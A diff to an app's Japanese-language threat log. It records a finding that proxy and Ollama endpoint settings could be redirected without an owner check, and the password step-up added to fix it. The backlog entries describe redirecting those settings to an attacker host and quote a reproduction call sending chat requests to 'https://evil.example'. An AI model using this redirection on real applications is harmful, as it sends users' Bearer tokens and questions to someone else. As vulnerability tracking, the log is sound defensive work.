@@ -3668,6 +3668,21 @@
         "file": "src/main/__tests__/selfAttestation.test.ts",
         "test": "★ 1 ファイルを 1 byte 変えると hash-mismatch で、その道を名指しする (threat: T-218)"
       }
+    },
+    {
+      "id": "T-219",
+      "found": "2026-10-29",
+      "foundBy": "癌の対応表 (パス 553) の「免疫チェックポイント = 守りの無効化」の軸を、守りを決める設定へ当てた。アプリがどこへ資格情報と本文を送るかを決める設定 2 つ (BYO プロキシ・Ollama の接続先) の書き手を走査し (setProxyConfig の非 null 2 か所のうち書く物 1 / OLLAMA_ENDPOINT_KEY の setItem 1)、本人確認 (T-183) の掛かる範囲と突き合わせた: 本人確認は main の IPC (action:invoke / secrets:*) にだけ在り、この 2 つは IPC を通らず (ブラウザ版の shim.invoke にも無い)、jsdom で実物の画面を描いて押すと**どちらも 1 押しで書けた** (確認の文 0・保管層にそのまま入る)。資格情報そのものの書き込みにはデスクトップ版で本人確認が要るのに、その資格情報が丸ごと渡る先を変える操作には何も要らなかった。backlog の C1 連鎖 (proxy) と C4 (ollama.endpoint) が名指ししていた「送り先の変更を利用者に確認させる」側。",
+      "surface": "renderer",
+      "class": "ssrf-and-credential-egress",
+      "severity": "medium",
+      "title": "送り先を決める設定 (BYO プロキシ・Ollama の接続先) は通常の保存と同じ 1 押しで書けた —— 資格情報が丸ごと渡る先の変更に、本人の確認が無かった",
+      "status": "mitigated",
+      "fix": "持ち主の確認 (step-up) を書く前に置く。判定と文面は src/renderer/security/egressStepUp.ts の 1 つ (proxyChangeNeedsStepUp = 常に・ollamaEndpointNeedsStepUp = 解決した先が loopback でないときだけ・stepUpReason は送り先のホストだけを名乗り共有秘密も path も映さない)。部品 components/StepUpPassword.tsx が文を描き、保管庫の verifyPassword (新設 · 状態を変えない照合 —— unlock と違い鍵を残さない) で合ったときだけ onApproved を 1 度呼ぶ。SettingsPage の「保存」は書かずに pending へ置き applySave が書く・OllamaPage の「接続テスト」はブラウザ版で端末の外へ向く接続先だけ pendingEndpoint へ置き writeEndpoint が書く (デスクトップ版の main は 127.0.0.1 に固定なので掛けない・useBuildKind が null のあいだも掛けない)。違えば「パスワードが違います。送り先は変えていません。」、やめれば「何も変えていません」。削除 (setProxyConfig(null)) は門の外 (消す口は閉じない)。母集団は src/renderer/__tests__/egressSettingWriterCensus.test.ts が両方向で持つ。**限界**: 門はレンダラーの中に在り、レンダラーを乗っ取った相手 (別の file:// の HTML · C1) は保管層へ直接書ける —— 止めるのは人の手 (貼り付けを促す指示に従う前に立ち止まれる)。保管層を main へ移す (ブラウザ版には無い) か保管庫 (暗号化) へ移すかは C1 の設計判断と一緒に決める。",
+      "regression": {
+        "file": "src/renderer/pages/__tests__/proxyStepUpOnScreen.test.ts",
+        "test": "★ 「保存」を押しただけでは書かれず、確認の段が出る —— 文は送り先のホストを名乗り共有秘密を映さない (threat: T-219)"
+      }
     }
   ],
   "huntBacklog": [
@@ -3679,7 +3694,7 @@
     {
       "surface": "network",
       "item": "C1 の連鎖: 別の HTML が proxy 設定 (IDB business-hub-preferences) を攻撃者のホストへ書き換え、CORS で BYO プロキシを通る SaaS の Bearer が攻撃者へ届く",
-      "why": "コードは整合する (proxy.ts の読みと、envelope に headers = Authorization を入れて POST する経路・proxyEndpoint.ts が任意の公開 https を許す) が、end-to-end は未実行。再現は C1 の後に、プロキシの URL 欄を書き換えた状態で SaaS 書き込みを 1 度押して送り先を見る。直すなら proxy 設定を保管庫 (暗号化) へ移すか、送り先の変更を利用者に確認させる。"
+      "why": "コードは整合する (proxy.ts の読みと、envelope に headers = Authorization を入れて POST する経路・proxyEndpoint.ts が任意の公開 https を許す) が、end-to-end は未実行。再現は C1 の後に、プロキシの URL 欄を書き換えた状態で SaaS 書き込みを 1 度押して送り先を見る。直すなら proxy 設定を保管庫 (暗号化) へ移すか、送り先の変更を利用者に確認させる。 2026-10-29 (T-219): 画面からの変更には保管庫のパスワードの確認 (step-up) を置いた —— 人の手の経路は閉じた。別の HTML が IDB へ直接書く経路 (C1) はそのまま。"
     },
     {
       "surface": "renderer",
@@ -3694,7 +3709,7 @@
     {
       "surface": "renderer",
       "item": "C4 AI の送り先を localStorage で差し替える: servicehub.ollama.endpoint に任意の https を書くと、コンシェルジュの自由質問が攻撃者のホストへ送られる",
-      "why": "2026-10-14 に実物で再現: chatOllama({endpoint:'https://evil.example', …}) は https://evil.example/api/chat へ送り (ok:true)、https://evil.example/ollama も同じ、http://evil.example:11434 は bad-endpoint で送らない。送る前の名乗り (T-010) は「設定した Ollama (evil.example) へ送ります —— この端末の外です」と出る。根は isAllowedOllamaBase が任意の https を設計として許すこと (リバースプロキシのトンネルが正当) と、設定が平文の localStorage に在ること (C1)。C1 の設計判断 (保存値を保管庫へ / 送り先の変更を利用者に確認させる) と一緒に決める。"
+      "why": "2026-10-14 に実物で再現: chatOllama({endpoint:'https://evil.example', …}) は https://evil.example/api/chat へ送り (ok:true)、https://evil.example/ollama も同じ、http://evil.example:11434 は bad-endpoint で送らない。送る前の名乗り (T-010) は「設定した Ollama (evil.example) へ送ります —— この端末の外です」と出る。根は isAllowedOllamaBase が任意の https を設計として許すこと (リバースプロキシのトンネルが正当) と、設定が平文の localStorage に在ること (C1)。C1 の設計判断 (保存値を保管庫へ / 送り先の変更を利用者に確認させる) と一緒に決める。 2026-10-29 (T-219): 画面からの変更は、端末の外へ向く接続先だけ保管庫のパスワードの確認 (step-up) を通す —— 人の手の経路は閉じた。別の HTML が localStorage へ直接書く経路 (C1) はそのまま。"
     },
     {
       "surface": "renderer",
